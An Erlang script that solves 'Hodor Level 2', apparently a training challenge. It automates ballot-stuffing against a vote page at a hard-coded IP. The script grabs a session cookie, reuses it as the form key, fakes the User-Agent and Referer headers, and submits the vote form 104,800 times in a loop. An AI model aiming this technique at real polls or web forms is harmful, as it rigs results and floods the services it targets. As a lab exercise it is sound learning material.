%% ===-----Hodor Level 2---------------------------------------------===
%%          Hodor Level 2 Project, by Julien Barbier.
%%  "Make 1024 votes in this page: http://173.246.108.142/level2.php"
%%  Solution using Erlang code.
%%
%%  by Alexandro de Oliveira.
%% ===---------------------------------------------------------------===

%% Defining the module and exporting each function(to Erlang Shell):
-module(hodor2).
-export([main/0, vote/2, posting/0, parse/3, getCookie/1]).
%% Parsing the Cookie(I didn't find a specific function/method to parse the cookie or
%% a cookie session manager):
parse(A, S, I) ->
    T = string:tokens(A, S),
    lists:nth(I, T). %% In Erlang the last line is returned(we don't need to "return").
%% Getting one cookie with a HEAD request:
getCookie(URL) ->
    {ok,{ _,Headers, _}} = httpc:request(head, { URL, []}, [], []),
    C = proplists:get_value("set-cookie", Headers),
    Cookie = parse(C, ";", 1),
    parse(Cookie, "=", 2).
%% Making our POST request.
posting() ->
Method = post,
URL = "http://173.246.108.142/level2.php",
Cookie = getCookie(URL),
Header = [{"User-Agent","Windows NT 5.1 havk64 Erlang Requests"}, {"Cookie", "HoldTheDoor=" ++ Cookie},
    {"Referer", URL}],
Type = "application/x-www-form-urlencoded",
Body = "id=404&holdthedoor=submit&key=" ++ Cookie,
httpc:request(Method, {URL, Header, Type, Body }, [], []). %% The POST request.

%% Our "for loop" in a form of a recursive function(Erlang way of doing it)
%% Functional(as opposed to Imperative) languages don't implement loops.
vote(0,_) ->
   [];
   vote(N,Term) when N > 0 ->
   posting(),
   [Term|vote(N-1,Term)].

%% Starting the http client and the iterations from our main function.
main() ->
    ssl:start(),
    application:start(inets),
    vote(104800, 1).
